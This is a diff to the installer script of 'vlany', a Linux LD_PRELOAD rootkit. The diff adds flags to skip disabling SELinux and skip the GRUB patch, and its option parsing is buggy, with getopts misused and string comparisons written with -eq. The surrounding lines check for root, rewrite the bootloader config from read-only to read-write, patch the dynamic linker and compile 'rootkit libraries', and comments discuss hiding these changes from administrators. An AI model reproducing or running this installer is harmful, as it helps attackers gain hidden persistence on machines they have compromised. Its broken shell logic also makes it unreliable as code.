@@ -3,6 +3,12 @@
 # errors and fatal risks
 [ $(uname) != "Linux" ] && { echo "Not on a Linux system. Exiting."; exit; } # i plan on adding support for OS X once everything else it dealt with
 [ $(id -u) != 0 ] && { echo "Not root. Exiting."; exit; }
+ARGS=("--no-selinux-disable" "--no-brick-patch" "--cli")
+while getopts no-selinux-disable:no-brick-patch:cli: arg; do
+    case "${arg}"; in
+        "no-selinux-disable") NSD=""
+    esac
+done
 if [ -f /etc/selinux/config ]; then
     echo "SELinux config found on system. Checking SELinux status."
     if [[ $(cat /etc/selinux/config | grep "SELINUX=" | tail -n 1) == *"enforcing"* ]]; then
@@ -15,7 +21,7 @@ if [ -f /etc/selinux/config ]; then
     else
         echo "SELinux config is clean."
     fi
-    
+
     # actually verify if the box has been rebooted or not, can by bypassed with setenforce 0 but i'm gay
     if [[ $(sestatus -v | head -n 1) == *"enabled"* ]]; then
         echo "SELinux is still enabled. Reboot."
@@ -27,14 +33,16 @@ fi
 
 # temporary fix for the reboot brick, going to add a mechanism to vlany to hide changes to the grub.conf file later.
 # there's also some stuff i can do with init to kinda hide these changes a BIT more...
-echo "Attempting to prevent reboot brick"
-read -p "Enter location of bootloader config file (if grub2, config file is /boot/grub/grub.cfg) [/etc/grub.conf]: "
-[ -z $REPLY ] && GRUB_CONF="/etc/grub.conf"
-[ ! -z $REPLY ] && GRUB_CONF="$REPLY"
-[ ! -f "$GRUB_CONF" ] && echo "File $GRUB_CONF doesn't exist. You might have to manually find and edit the config file. (read this part of install.sh)"
-[ -f "$GRUB_CONF" ] && sed -i -- "s/\bro\b/rw/g" $GRUB_CONF # ok thats better, change read-only to read/write. ruins some recovery stuff, but an ok fix for now...
-[[ "$GRUB_CONF" == *"/etc/grub.d/"* ]] && { echo "Updating grub"; update-grub; }
-echo "Done."
+if [ ! "$1" -eq "--no-brick-patch" ] || [ ! "$2" -eq "--no-brick-patch" ]; then
+    echo "Attempting to prevent reboot brick"
+    read -p "Enter location of bootloader config file (if grub2, config file is /boot/grub/grub.cfg) [/etc/grub.conf]: "
+    [ -z $REPLY ] && GRUB_CONF="/etc/grub.conf"
+    [ ! -z $REPLY ] && GRUB_CONF="$REPLY"
+    [ ! -f "$GRUB_CONF" ] && echo "File $GRUB_CONF doesn't exist. You might have to manually find and edit the config file. (read this part of install.sh)"
+    [ -f "$GRUB_CONF" ] && sed -i -- "s/\bro\b/rw/g" $GRUB_CONF # ok thats better, change read-only to read/write. ruins some recovery stuff, but an ok fix for now...
+    [[ "$GRUB_CONF" == *"/etc/grub.d/"* ]] && { echo "Updating grub"; update-grub; }
+    echo "Done."
+fi
 
 [ ! -e /proc ] && { echo "We're in a terrible jail. /proc doesn't exist. Exiting."; exit; }
 if [ -z "`which gcc`" ]; then
@@ -129,7 +137,7 @@ install_vlany_prerequisites ()
         pacman -Syy &>/dev/null
         pacman -S --noconfirm attr pam openssl libpcap base-devel &>/dev/null
     fi
-    
+
     if [ -f /usr/bin/yum ]; then
         yum install -y -q -e 0 python2
     elif [ -f /usr/bin/apt-get ]; then
@@ -322,7 +330,7 @@ setup_vlany ()
 # gay fuck
 export TERM=xterm
 
-if [ "$1" == "--cli" ]; then
+if [ "$1" -eq "--cli" ] || [ "$2" -eq "--cli" ]; then
     echo "Installing vlany without a tui."
 
     read -p "Do you want to compile or install vlany? (enter 'compile' or 'install'): "
@@ -357,6 +365,7 @@ if [ "$1" == "--cli" ]; then
     compile_vlany
     echo "Rootkit libraries compiled."
     sleep 2
+    exit
 
     [ $STATUS == "compile" ] && { rm -rf *.o bashrc shell_msg bd_readme; exit; }
 
@@ -397,10 +406,10 @@ else
     dialog --title "$TITLE" --infobox "Installing prerequisite packages...\nPlease wait." 4 50 3>&1 1>&2 2>&3
     install_vlany_prerequisites
     dialog --title "$TITLE" --msgbox "Packages installed." 5 50
-    
+
     [ $RESPONSE != 1 ] && { dialog --title "$TITLE" --infobox "Patching dynamic linker." 3 50 3>&1 1>&2 2>&3; patch_dynamic_linker; dialog --title "$TITLE" --msgbox "Dynamic linker patched." 5 50; }
     [ $RESPONSE == 1 ] && { NEW_PRELOAD="imgay"; }
-    
+
     get_vlany_settings
 
     config_vlany
